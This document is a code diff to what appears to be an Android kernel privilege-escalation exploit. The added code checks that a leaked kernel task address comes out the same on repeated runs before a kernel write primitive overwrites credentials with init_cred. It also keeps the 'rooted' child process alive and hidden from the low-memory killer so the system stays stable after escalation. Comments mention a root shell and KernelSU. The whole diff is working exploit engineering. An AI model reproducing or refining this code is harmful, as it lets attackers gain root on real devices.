@@ -688,13 +688,33 @@ static uintptr_t perf_find_task(void) {
 
 struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };
 
+/* rooted exits kfree the static init_cred (w2 stores it with no
+ * get_cred). park forever, oom_score_adj -1000 so lmkd skips us. */
+static void park_rooted_child(void) {
+  FILE *f = fopen("/proc/self/oom_score_adj", "w");
+  if (f) {
+    fputs("-1000", f);
+    fclose(f);
+  }
+  for (;;) pause();
+}
+
 static void child_main(struct child_pipes *p) {
   close(p->task_r); close(p->cmd_w); close(p->uid_r);
   setpgid(0, 0);  /* own group; the parent kills the whole tree on timeout */
   fcntl(p->uid_w, F_SETFD, FD_CLOEXEC);  /* keep the probe pipe out of the
                                           * root shell / ksud chain */
   prctl(PR_SET_NAME, "ghostleaf_0123456789");
+  /* a real leak reproduces, a fluke vote winner does not. w2 writes to
+   * this address, so two runs must agree or the leak is discarded. */
   uintptr_t my_task = perf_find_task();
+  int leak_agreed = 0;
+  for (int i = 0; i < 2 && my_task; i++) {
+    uintptr_t again = perf_find_task();
+    if (again == my_task) { leak_agreed = 1; break; }
+    my_task = again;
+  }
+  if (!leak_agreed) my_task = 0;
   write(p->task_w, &my_task, sizeof(my_task));
   close(p->task_w);
   if (!my_task) _exit(1);
@@ -752,6 +772,12 @@ static void child_main(struct child_pipes *p) {
       uint32_t report =
         ((uint32_t)len << 8) | (uint32_t)(unsigned char)comm[0];
       write(p->uid_w, &report, sizeof(report));
+    }
+    else if (cmd == 'P') {
+      /* w2 rooted this task; park */
+      close(p->cmd_r);
+      close(p->uid_w);
+      park_rooted_child();
     }
     else if (cmd == 'G' || cmd == 'X') break;
   }
